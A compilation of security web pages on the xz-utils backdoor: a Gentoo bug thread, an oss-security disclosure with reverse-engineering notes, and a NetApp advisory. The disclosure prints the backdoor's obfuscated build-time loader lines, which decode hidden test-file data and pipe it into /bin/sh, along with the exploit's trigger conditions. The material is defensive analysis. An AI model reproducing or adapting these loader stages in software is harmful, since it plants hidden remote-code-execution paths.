zstd (another  > [de]compression program) which can be complied with USE +lzma?  > The linux kernel itself with CONFIG_XZ_DEC?  sshd and indeed liblzma was apparently chosen deliberately for its convenience as a remove code execution attack vector, particularly as RedHat and others were friendly enough to patch them together (something to look into, eventually -- was this prepared a long time ago? When and by whom were such patches pushed?), but -- as far as we know yet -- there is no suggestion that authentication bypass was attempted or even intended, nor that archives other than the encrypted public keys were supposed to be used. If you can run a payload by simply sending a crafted public key, there is no need for authentication bypass...  Where direct ssh access from the internet is not required, users should restrict sshd to accept connections only from the local network (and connect to it from the internet using wireshark, if needed). ```  [Comment 39](#c39)  Alexander Wessel    2024-03-30 23:17:57 UTC  ``` (In reply to Alexander Wessel from [comment #38](show_bug.cgi?id=928134#c38)) > wireshark WireGUARD, of course. I do that all the time. :/ ```   [Comment 40](#c40)  Niklāvs Koļesņikovs    2024-03-31 09:41:16 UTC  Comment hidden (offtopic)  ``` I'll correct the above statement to __always__ VPN into any remote access daemon which has root and probably even just full local user rights. Exposing such things directly to the internet is asking for the next 0-day to hit you even if it's a once or twice per century kind of bug.  WireGuard is quite simple to set up and costs nothing, so just use it. And best not to use SSH as the poor man's VPN here. ;) ```   [Comment 41](#c41)  Alexandru N. Barloiu    2024-03-31 23:16:13 UTC  Comment hidden (offtopic)  ``` BTW, its not all hardware. its only x86_64. The way it works is, the build system is broken is some archives. The backdoor is not in the code. Its in some object files left there. That get included in the final library, but are not built on said system. The are artifacts that remain in the archive. And they are x86_64 only. The backdoor is injected by a single test at the end of configure, which in turn use that binary test to uncompress some code and execute it, which in turn compromise the existing build system to inject the another code into the resulting library binary. So it has 2 parts. The one that injects it, and the one that gets injected. Second one at least is x86_64 only. And the tests in configure system also point to x86_64 only. ```   [Comment 42](#c42)  Alexandru N. Barloiu    2024-03-31 23:53:40 UTC  Comment hidden (offtopic)  ``` <https://www.openwall.com/lists/oss-security/2024/03/29/4/1>  This is part of what configure does. The modifications on configure already did before. The injection part.  <https://www.openwall.com/lists/oss-security/2024/03/29/4/2>  This is the actual objected injected. ```  [Comment 43](#c43)  Jeffrey Walton    2024-04-01 00:07:00 UTC  ``` An important comment from oss-security mailing list message, <<https://www.openwall.com/lists/oss-security/2024/03/31/4>>:  commit f9cf4c05edd14dedfe63833f8ccbe41b55823b00 (HEAD -> master, origin/master, origin/HEAD) Author: Lasse Collin <lasse.collin@...aani.org> Date:   Sat Mar 30 14:36:28 2024 +0200      CMake: Fix sabotaged Landlock sandbox check.      It never enabled it. ```   [Comment 44](#c44)  sanomiad    2024-04-01 04:37:12 UTC  Comment hidden (offtopic)  ``` (In reply to revamps.warbler-0w from [comment #17](show_bug.cgi?id=928134#c17)) > Github has disabled the XZ repository entirely as of 1:29 AM UTC  Yes, and should remain that way for a very long time or indefinitely.   The current version of xz that's not "compromised" need to be frozen and excluded from receiving updates.    Happy threat hunting. ```  [Comment 45](#c45)  Sam James   archtester Gentoo Infrastructure gentoo-dev Security  2024-04-01 04:41:29 UTC  ``` Please keep general commentary out of the bug - those are better placed on forums, mailing lists, IRC, etc.  There's a lot of people CC'd to this for important developments. ```  [Comment 46](#c46)  Larry the Git Cow   gentoo-dev  2024-05-29 17:31:32 UTC  ``` The bug has been referenced in the following commit(s):  <https://gitweb.gentoo.org/repo/gentoo.git/commit/?id=169d529ced8652aad48e64a6e3abbd8240872da9>  commit 169d529ced8652aad48e64a6e3abbd8240872da9 Author:     Sam James <sam@gentoo.org> AuthorDate: 2024-05-29 17:29:42 +0000 Commit:     Sam James <sam@gentoo.org> CommitDate: 2024-05-29 17:30:57 +0000      app-arch/xz-utils: add 5.6.2          This release is signed by the original maintainer (and future releases     going forward will be too) Lasse Collin.          I worked with him on these releases and have reproduced his tarball     with only minor differences in dates. I encourage people to do the same:     using the 'mydist' target in the Makefile is recommended to minimise differences.          In future, I may package libtool-vanilla like we do for autoconf-vanilla     and automake-vanilla to make comparisons easier.          Bug: <https://bugs.gentoo.org/928134>     Signed-off-by: Sam James <sam@gentoo.org>   app-arch/xz-utils/Manifest              |   2 +  app-arch/xz-utils/xz-utils-5.6.2.ebuild | 179 ++++++++++++++++++++++++++++++++  app-arch/xz-utils/xz-utils-9999.ebuild  |   2 +-  3 files changed, 182 insertions(+), 1 deletion(-)  <https://gitweb.gentoo.org/repo/gentoo.git/commit/?id=d453a7ecd664ece027933fbdc1746d054fc768b5>  commit d453a7ecd664ece027933fbdc1746d054fc768b5 Author:     Sam James <sam@gentoo.org> AuthorDate: 2024-05-29 17:22:02 +0000 Commit:     Sam James <sam@gentoo.org> CommitDate: 2024-05-29 17:30:57 +0000      app-arch/xz-utils: add 5.4.7          This release is signed by the original maintainer (and future releases     going forward will be too) Lasse Collin.          I worked with him on these releases and have reproduced his tarball     with only minor differences in dates. I encourage people to do the same:     using the 'mydist' target in the Makefile is recommended to minimise differences.          In future, I may package libtool-vanilla like we do for autoconf-vanilla     and automake-vanilla to make comparisons easier.          Bug: <https://bugs.gentoo.org/928134>     Signed-off-by: Sam James <sam@gentoo.org>   app-arch/xz-utils/Manifest              |   2 +  app-arch/xz-utils/xz-utils-5.4.7.ebuild | 140 ++++++++++++++++++++++++++++++++  2 files changed, 142 insertions(+)  <https://gitweb.gentoo.org/repo/gentoo.git/commit/?id=71f142e5b6ac48ef515603e093f40c1ca4add085>  commit 71f142e5b6ac48ef515603e093f40c1ca4add085 Author:     Sam James <sam@gentoo.org> AuthorDate: 2024-05-29 17:18:46 +0000 Commit:     Sam James <sam@gentoo.org> CommitDate: 2024-05-29 17:30:56 +0000      sec-keys/openpgp-keys-lassecollin: add 20240529          The key is the same before but:     1) renewed;     2) dropped Jia's signature from it.          Bug: <https://github.com/tukaani-project/xz/issues/110>     Bug: <https://bugs.gentoo.org/928134>     Signed-off-by: Sam James <sam@gentoo.org>   sec-keys/openpgp-keys-lassecollin/Manifest           |  1 +  .../openpgp-keys-lassecollin-20240529.ebuild         | 20 ++++++++++++++++++++  2 files changed, 21 insertions(+) ```  [Comment 47](#c47)  Sam James   archtester Gentoo Infrastructure gentoo-dev Security  2024-05-29 17:33:29 UTC  ``` I will update the GLSA shortly. ```  [Comment 48](#c48)  Larry the Git Cow   gentoo-dev  2024-05-29 18:08:22 UTC  ``` The bug has been referenced in the following commit(s):  <https://gitweb.gentoo.org/data/glsa.git/commit/?id=23f9961964e4ef86fe4fed4e36f8f2cbe2b47dfe>  commit 23f9961964e4ef86fe4fed4e36f8f2cbe2b47dfe Author:     Sam James <sam@gentoo.org> AuthorDate: 2024-05-29 18:07:52 +0000 Commit:     Sam James <sam@gentoo.org> CommitDate: 2024-05-29 18:08:17 +0000      [ GLSA 202403-04 ] XZ utils: update for fixed versions          Bug: <https://bugs.gentoo.org/928134>     Signed-off-by: Sam James <sam@gentoo.org>   glsa-202403-04.xml | 12 +++++++++---  1 file changed, 9 insertions(+), 3 deletions(-) ```  [Comment 49](#c49)  Larry the Git Cow   gentoo-dev  2024-05-29 18:37:02 UTC  ``` The bug has been referenced in the following commit(s):  <https://gitweb.gentoo.org/repo/gentoo.git/commit/?id=9ac6efd96e3d19312d4bb1017b5d6a23ec6c7ab1>  commit 9ac6efd96e3d19312d4bb1017b5d6a23ec6c7ab1 Author:     Sam James <sam@gentoo.org> AuthorDate: 2024-05-29 18:36:11 +0000 Commit:     Sam James <sam@gentoo.org> CommitDate: 2024-05-29 18:36:34 +0000      profiles: last-rite sec-keys/openpgp-keys-jiatan          OpenPGP key of malicious xz co-maintainer. This key is no longer used     by any ebuilds in tree. Removal on 2024-06-29.          Bug: <https://bugs.gentoo.org/928134>     Signed-off-by: Sam James <sam@gentoo.org>   profiles/package.mask | 6 ++++++  1 file changed, 6 insertions(+)  <https://gitweb.gentoo.org/repo/gentoo.git/commit/?id=b57579a37f3071b9e3a87ae3cc3805317996930c>  commit b57579a37f3071b9e3a87ae3cc3805317996930c Author:     Sam James <sam@gentoo.org> AuthorDate: 2024-05-29 18:33:29 +0000 Commit:     Sam James <sam@gentoo.org> CommitDate: 2024-05-29 18:36:34 +0000      app-arch/xz-utils: drop old & masked 5.4.6-r1          We had no evidence this version was bad despite being signed by the malicious     maintainer Jia Tan so we kept it around but masked. Now that 5.4.7+ is out,     there's no value in keeping it around at all.          We can now last-rite sec-keys/openpgp-keys-jiatan which I'll do shortly.          Bug: <https://bugs.gentoo.org/928134>     Signed-off-by: Sam James <sam@gentoo.org>   app-arch/xz-utils/Manifest                 |   2 -  app-arch/xz-utils/xz-utils-5.4.6-r1.ebuild | 140 -----------------------------  2 files changed, 142 deletions(-) ```  [Comment 50](#c50)  Sam James   archtester Gentoo Infrastructure gentoo-dev Security  2024-05-29 18:43:41 UTC  ``` Fixed releases are out and GLSA updated. I think we're all done.  Lasse has updated the website, refreshed <https://tukaani.org/xz-backdoor/>, and published 1.0 of the review notes at <https://tukaani.org/xz-backdoor/review.html>. ```  [Comment 51](#c51)  Larry the Git Cow   gentoo-dev  2024-06-29 14:16:44 UTC  ``` The bug has been referenced in the following commit(s):  <https://gitweb.gentoo.org/repo/gentoo.git/commit/?id=255b78b1771bcdd1b00a193c13d074a5cc7dca59>  commit 255b78b1771bcdd1b00a193c13d074a5cc7dca59 Author:     Arthur Zamarin <arthurzam@gentoo.org> AuthorDate: 2024-06-29 14:16:17 +0000 Commit:     Arthur Zamarin <arthurzam@gentoo.org> CommitDate: 2024-06-29 14:16:17 +0000      sec-keys/openpgp-keys-jiatan: treeclean          Bug: <https://bugs.gentoo.org/928134>     Signed-off-by: Arthur Zamarin <arthurzam@gentoo.org>   profiles/package.mask                                |  7 -------  sec-keys/openpgp-keys-jiatan/Manifest                |  1 -  sec-keys/openpgp-keys-jiatan/metadata.xml            |  9 ---------  .../openpgp-keys-jiatan-20230505.ebuild              | 20 --------------------  4 files changed, 37 deletions(-) ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=928134)
* - [XML](show_bug.cgi?ctype=xml&id=928134)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=928134)
* - [Clone In The Same
  Product](enter_bug.cgi?cloned_bug_id=928134&product=Gentoo%20Security)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
  + |
    [New Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?id=928134&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](show_bug.cgi?id=928134&GoAheadAndLogIn=1#forgot)
    Login:

    [x]



=== Content from www.openwall.com_c23cad9b_20250111_034002.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](35) [[next>]](37) [[<thread-prev]](35) [[thread-next>]](37) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <CAN_LGv3oHFcmVS4vxyz4nxfQ7F9Vr1f-JB8ZqYfD9Q8vuTsEsA@mail.gmail.com>
Date: Sun, 31 Mar 2024 03:45:58 +0800
From: "Alexander E. Patrakov" <patrakov@...il.com>
To: oss-security@...ts.openwall.com
Subject: Re: backdoor in upstream xz/liblzma leading to ssh
 server compromise

Let me reshare one more piece of information: this backdoor is an RCE,
not an authentication bypass.

<https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b>

Copy-pasting all the text written by Filippo Valsorda from there below.

=====
Filippo Valsorda
@filippo.abyssdomain.expert
I'm watching some folks reverse engineer the xz backdoor, sharing some
*preliminary* analysis with permission. The hooked RSA_public_decrypt
verifies a signature on the server's host key by a fixed Ed448 key,
and then passes a payload to system(). It's RCE, not auth bypass, and
gated/unreplayable.

This might be the best executed supply chain attack we've seen
described in the open, and it's a nightmare scenario: malicious,
competent, authorized upstream in a widely used library. Looks like
this got caught by chance. Wonder how long it would have taken
otherwise.

The payload is extracted from the N value (the public key) passed to
RSA_public_decrypt, checked against a simple fingerprint, and
decrypted with a fixed ChaCha20 key before the Ed448 signature
verification.

RSA_public_decrypt is a (weirdly named) signature verification
function. <https://www.openssl.org/docs/manmaster/man3/RSA_public_decrypt.html>
(Why "decrypt"? RSA sig verification is the same op of RSA encryption.
🤷‍♂️)

The RSA_public_decrypt public key can be attacker-controlled pre-auth
by using OpenSSH certificates. OpenSSH certs are weird in that they
include the signer's public key. OpenSSH checks the signature on
parsing. <https://github.com/openssh/openssh-portable/blob/281ea25a44bff53eefb4af7bab7aa670b1f8b6b2/PROTOCOL.certkeys#L207-L219>

Here's a script by Keegan Ryan for sending a custom public key in a
certificate, which on a backdoored system will reach the hooked
function. <https://gist.github.com/keeganryan/a6c22e1045e67c17e88a606dfdf95ae4>

Apparently the backdoor reverts back to regular operation if the
payload is malformed or the signature from the attacker's key doesn't
verify. Unfortunately, this means that unless a bug is found, we can't
write a reliable/reusable over-the-network scanner.

On Sat, Mar 30, 2024 at 12:09 AM Andres Freund <andres@...razel.de> wrote:
>
> Hi,
>
> After observing a few odd symptoms around liblzma (part of the xz package) on
> Debian sid installations over the last weeks (logins with ssh taking a lot of
> CPU, valgrind errors) I figured out the answer:
>
> The upstream xz repository and the xz tarballs have been backdoored.
>
> At first I thought this was a compromise of debian's package, but it turns out
> to be upstream.
>
>
> == Compromised Release Tarball ==
>
> One portion of the backdoor is *solely in the distributed tarballs*. For
> easier reference, here's a link to debian's import of the tarball, but it is
> also present in the tarballs for 5.6.0 and 5.6.1:
>
> <https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63>
>
> That line is *not* in the upstream source of build-to-host, nor is
> build-to-host used by xz in git.  However, it is present in the tarballs
> released upstream, except for the "source code" links, which I think github
> generates directly from the repository contents:
>
> <https://github.com/tukaani-project/xz/releases/tag/v5.6.0>
> <https://github.com/tukaani-project/xz/releases/tag/v5.6.1>
>
>
> This injects an obfuscated script to be executed at the end of configure. This
> script is fairly obfuscated and data from "test" .xz files in the repository.
>
>
> This script is executed and, if some preconditions match, modifies
> $builddir/src/liblzma/Makefile to contain
>
> am__test = bad-3-corrupt_lzma2.xz
> ...
> am__test_dir=$(top_srcdir)/tests/files/$(am__test)
> ...
> sed rpath $(am__test_dir) | $(am__dist_setup) >/dev/null 2>&1
>
>
> which ends up as
> ...; sed rpath ../../../tests/files/bad-3-corrupt_lzma2.xz | tr "        \-_" "         _\-" | xz -d | /bin/bash >/dev/null 2>&1; ...
>
> Leaving out the "| bash" that produces
>
> ####Hello####
> #��Z�.hj�
> eval `grep ^srcdir= config.status`
> if test -f ../../config.status;then
> eval `grep ^srcdir= ../../config.status`
> srcdir="../../$srcdir"
> fi
> export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +724)";(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")|xz -F raw --lzma1 -dc|/bin/sh
> ####World####
>
> After de-obfuscation this leads to the attached injected.txt.
>
>
> == Compromised Repository ==
>
> The files containing the bulk of the exploit are in an obfuscated form in
>   tests/files/bad-3-corrupt_lzma2.xz
>   tests/files/good-large_compressed.lzma
> committed upstream. They were initially added in
> <https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0>
>
> Note that the files were not even used for any "tests" in 5.6.0.
>
>
> Subsequently the injected code (more about that below) caused valgrind errors
> and crashes in some configurations, due the stack layout differing from what
> the backdoor was expecting.  These issues were attempted to be worked around
> in 5.6.1:
>
> <https://github.com/tukaani-project/xz/commit/e5faaebbcf02ea880cfc56edc702d4f7298788ad>
> <https://github.com/tukaani-project/xz/commit/72d2933bfae514e0dbb123488e9f1eb7cf64175f>
> <https://github.com/tukaani-project/xz/commit/82ecc538193b380a21622aea02b0ba078e7ade92>
>
> For which the exploit code was then adjusted:
> <https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89>
>
> Given the activity over several weeks, the committer is either directly
> involved or there was some quite severe compromise of their
> system. Unfortunately the latter looks like the less likely explanation, given
> they communicated on various lists about the "fixes" mentioned above.
>
>
> Florian Weimer first extracted the injected code in isolation, also attached,
> liblzma_la-crc64-fast.o, I had only looked at the whole binary. Thanks!
>
>
> == Affected Systems ==
>
> The attached de-obfuscated script is invoked first after configure, where it
> decides whether to modify the build process to inject the code.
>
> These conditions include targeting only x86-64 linux:
>     if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then
>
> Building with gcc and the gnu linker
>     if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
>     exit 0
>     fi
>     if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
>     exit 0
>     fi
>     LDv=$LD" -v"
>     if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
>     exit 0
>
> Running as part of a debian or RPM package build:
>     if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
>
> Particularly the latter is likely aimed at making it harder to reproduce the
> issue for investigators.
>
>
> Due to the working of the injected code (see below), it is likely the backdoor
> can only work on glibc based systems.
>
>
> Luckily xz 5.6.0 and 5.6.1 have not yet widely been integrated by linux
> distributions, and where they have, mostly in pre-release versions.
>
>
> == Observing Impact on openssh server ==
>
> With the backdoored liblzma installed, logins via ssh become a lot slower.
>
> time ssh nonexistant@...alhost
>
> before:
> nonexistant@...alhost: Permission denied (publickey).
>
> before:
> real    0m0.299s
> user    0m0.202s
> sys     0m0.006s
>
> after:
> nonexistant@...alhost: Permission denied (publickey).
>
> real    0m0.807s
> user    0m0.202s
> sys     0m0.006s
>
>
> openssh does not directly use liblzma. However debian and several other
> distributions patch openssh to support systemd notification, and libsystemd
> does depend on lzma.
>
>
> Initially starting sshd outside of systemd did not show the slowdown, despite
> the backdoor briefly getting invoked. This appears to be part of some
> countermeasures to make analysis harder.
>
> Observed requirements for the exploit:
> a) TERM environment variable is not set
> b) argv[0] needs to be /usr/sbin/sshd
> c) LD_DEBUG, LD_PROFILE are not set
> d) LANG needs to be set
> e) Some debugging environments, like rr, appear to be detected. Plain gdb
>    appears to be detected in some situations, but not others
>
> To reproduce outside of systemd, the server can be started with a clear
> environment, setting only the required variable:
>
> env -i LANG=en_US.UTF-8 /usr/sbin/sshd -D
>
>
> In fact, openssh does not need to be started as a server to observe the
> slowdown:
>
> slow:
> env -i LANG=C /usr/sbin/sshd -h
>
> (about 0.5s on my older system)
>
>
> fast:
> env -i LANG=C TERM=foo /usr/sbin/sshd -h
> env -i LANG=C LD_DEBUG=statistics /usr/sbin/sshd -h
> ...
>
> (about 0.01s on the same system)
>
>
> It's possible that argv[0] other /usr/sbin/sshd also would have effect - there
> are obviously lots of servers linking to libsystemd.
>
>
> == Analyzing the injected code ==
>
> I am *not* a security researcher, nor a reverse engineer.  There's lots of
> stuff I have not analyzed and most of what I observed is purely from
> observation rather than exhaustively analyzing the backdoor code.
>
> To analyze I primarily used "perf record -e intel_pt//ub" to observe where
> execution diverges between the backdoor being active and not. Then also gdb,
> setting breakpoints before the divergence.
>
>
> The backdoor initially intercepts execution by replacing the ifunc resolvers
> crc32_resolve(), crc64_resolve() with different code, which calls
> _get_cpuid(), injected into the code (which previously would just be static
> inline functions).  In xz 5.6.1 the backdoor was further obfuscated, removing
> symbol names.
>
> These functions get resolved during startup, because sshd is built with
> -Wl,-z,now, leading to all symbols being resolved early. If started with
> LD_BIND_NOT=1 the backdoor does not appear to work.
>
>
> Below crc32_resolve() _get_cpuid() does not do much, it just sees that a
> 'completed' variable is 0 and increments it, returning the normal cpuid result
> (via a new _cpuid()). It gets to be more interesting during crc64_resolve().
>
> In the second invocation crc64_resolve() appears to find various information,
> like data from the dynamic linker, program arguments and environment. Then it
> perform various environment checks, including those above. There are other
> checks I have not fully traced.
>
> If the above decides to continue, the code appears to be parsing the symbol
> tables in memory. This is the quite slow step that made me look into the issue.
>
>
> Notably liblzma's symbols are resolved before many of the other libraries,
> including the symbols in the main sshd binary.  This is important because
> symbols are resolved, the GOT gets remapped read-only thanks to -Wl,-z,relro.
>
>
> To be able to resolve symbols in libraries that have not yet loaded, the
> backdoor installs an audit hook into the dynamic linker, which can be observed
> with gdb using
>   watch _rtld_global_ro._dl_naudit
> It looks like the audit hook is only installed for the main binary.
>
> That hook gets called, from _dl_audit_symbind, for numerous symbols in the
> main binary. It appears to wait for "RSA_public_decrypt@....plt" to be
> resolved.  When called for that symbol, the backdoor changes the value of
> RSA_public_decrypt@....plt to point to its own code.  It does not do this via
> the audit hook mechanism, but outside of it.
>
> For reasons I do not yet understand, it does change sym.st_value *and* the
> return value of from the audit hook to a different value, which leads
> _dl_audit_symbind() to do nothing - why change anything at all then?
>
> After that the audit hook is uninstalled again.
>
> It is possible to change the got.plt contents at this stage because it has not
> (and can't yet) been remapped to be read-only.
>
>
> I suspect there might be further changes performed at this stage.
>
>
> == Impact on sshd ==
>
> The prior section explains that RSA_public_decrypt@....plt was redirected to
> point into the backdoor code. The trace I was analyzing indeed shows that
> during a pubkey login the exploit code is invoked:
>
>             sshd 1736357 [010] 714318.734008:          1  branches:uH:      5555555ded8c ssh_rsa_verify+0x49c (/usr/sbin/sshd) =>     5555555612d0 RSA_public_decrypt@...+0x0 (/usr/sbin/sshd)
>
> The backdoor then calls back into libcrypto, presumably to perform normal authentication
>
>             sshd 1736357 [010] 714318.734009:          1  branches:uH:      7ffff7c137cd [unknown] (/usr/lib/x86_64-linux-gnu/liblzma.so.5.6.0) =>     7ffff792a2b0 RSA_get0_key+0x0 (/usr/lib/x86_64-linux-gnu/libcrypto.so.3)
>
>
> I have not yet analyzed precisely what is being checked for in the injected
> code, to allow unauthorized access. Since this is running in a
> pre-authentication context, it seems likely to allow some form of access or
> other form of remote code execution.
>
> I'd upgrade any potentially vulnerable system ASAP.
>
>
> == Bug reports ==
>
> Given the apparent upstream involvement I have not reported an upstream
> bug. As I initially thought it was a debian specific issue, I sent a more
> preliminary report to security@...ian.org.  Subsequently I reported the issue
> to distros@. CISA was notified by a distribution.
>
> Red Hat assigned this issue CVE-2024-3094.
>
>
> == Detecting if installation is vulnerable ==
>
> Vegard Nossum wrote a script to detect if it's likely that the ssh binary on a
> system is vulnerable, attached here. Thanks!
>
>
> Greetings,
>
> Andres Freund

--
Alexander E. Patrakov

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from twitter.com_deac8be9_20250111_034039.html ===



=== Content from security.netapp.com_d9d1160c_20250111_034038.html ===

[Skip to main content](#n-main-content)

* [NetApp.com](https://www.netapp.com/)
* [Support](https://mysupport.netapp.com)
* [Community](https://community.netapp.com)
* [Training](https://www.netapp.com/support-and-training/netapp-learning-services/)

* [Contact Us](https://www.netapp.com/company/contact-us/)

English
æ¥æ¬èª

[netapp-mark

NetApp

## Product Security](https://security.netapp.com)

Search

Search

* Search

Search

Search

* [Home](https://security.netapp.com/en)
* [Advisories](https://security.netapp.com/advisory/)
* [Bulletins](https://security.netapp.com/bulletins/)
* [Contact](https://security.netapp.com/contact/)
* [Policy](https://security.netapp.com/policy/)
* [Resources](https://security.netapp.com/resources/)
* [Certifications](https://security.netapp.com/certs/)

* [Home](https://security.netapp.com/en)
* [Advisory](https://security.netapp.com/advisory)
* [CVE-2024-3094 XZ Utils Vulnerability in NetApp Products](https://security.netapp.com/advisory/ntap-20240402-0001)

## CVE-2024-3094 XZ Utils Vulnerability in NetApp Products

circle-check-alt

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

close ×

#### Subscribe to NTAP-20240402-0001 updates

Email

Yes, please send me emails when NetApp Security Advisories are posted or updated.

 By filling and submitting this form, I understand and agree with the [NetApp privacy policy](https://www.netapp.com/company/legal/privacy-policy/ "Privacy Policy") and understand that I can unsubscribe from NetApp Security Advisory communications at any time.

Subscribe

#### Subscribe to NTAP-20240402-0001 advisory updates

OTP

Confirm

ionicons-v5-e

Confirmed your subscription to advisory alerts

close ×

#### Unsubscribe from NTAP-20240402-0001 advisory updates

Email

Unsubscribe

#### Unsubscribe from NTAP-20240402-0001 advisory updates

Email

Confirm

ionicons-v5-e

Unsubscribed successfully from advisory alerts

Subscribe to receive email updates

**Advisory ID:** NTAP-20240402-0001
**Version:**
8.0

**Last updated:**
06/03/2024

**Status:**
Final.

**CVEs:** CVE-2024-3094

Overview
#### Summary

Multiple NetApp products incorporate XZ Utils. XZ Utils versions 5.6.0 and 5.6.1 are susceptible to a vulnerability which when successfully exploited could lead to disclosure of sensitive information, addition or modification of data, or Denial of Service (DoS).

#### Impact

Successful exploitation of this vulnerability could lead to disclosure of sensitive information, addition or modification of data, or Denial of Service (DoS).

#### Vulnerability Scoring Details

| **CVE** | **Score** | **Vector** |
| --- | --- | --- |
| [CVE-2024-3094](https://nvd.nist.gov/vuln/detail/CVE-2024-3094) | 10.0 (CRITICAL) | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H |

#### Exploitation and Public Announcements

NetApp is aware of public discussion of this vulnerability.

#### References

* <https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1068024>
* <https://bugzilla.redhat.com/show_bug.cgi?id=2272210>
* <https://access.redhat.com/security/cve/CVE-2024-3094>

Affected Products
#### Affected Products

None.

#### Products Not Affected

* AFF BIOS - A700s
* AFF Baseboard Management Controller (BMC) - A700s
* ATTO FibreBridge - 7500N
* ATTO FibreBridge - 7600N
* Active IQ Unified Manager for Linux
* Active IQ Unified Manager for Microsoft Windows
* Active IQ Unified Manager for VMware vSphere
* Active IQ mobile app
* Astra Control Center
* Astra Control Center - NetApp Kubernetes Monitoring Operator
* Astra Control Provisioner
* Astra Trident
* Astra Trident Autosupport
* BlueXP Classification
* Brocade Fabric Operating System Firmware
* Brocade SAN Navigator (SANnav)
* Cloud Insights Acquisition Unit
* Cloud Insights Storage Workload Security Agent
* Cloud Insights Telegraf Agent
* Cloud Volumes ONTAP Mediator
* E-Series BIOS
* E-Series SANtricity OS Controller Software 11.x
* E-Series SANtricity Unified Manager and Web Services Proxy
* Element .NET SDK
* Element HealthTools
* Element JAVA SDK
* Element Plug-in for vCenter Server
* Element Powershell Tools
* Element Python SDK
* FAS/AFF BIOS - 2820
* FAS/AFF BIOS - 8300/8700/A400/C400
* FAS/AFF BIOS - A250/500f/C250
* FAS/AFF BIOS - A300/8200/A200/2650/2620/C190/A220/2720/2750/A150
* FAS/AFF BIOS - A320
* FAS/AFF BIOS - A700/9000
* FAS/AFF BIOS - A800/C800
* FAS/AFF BIOS - A900/9500
* FAS/AFF Baseboard Management Controller (BMC) - 8300/8700/A400/C400
* FAS/AFF Baseboard Management Controller (BMC) - A250/500f/C250
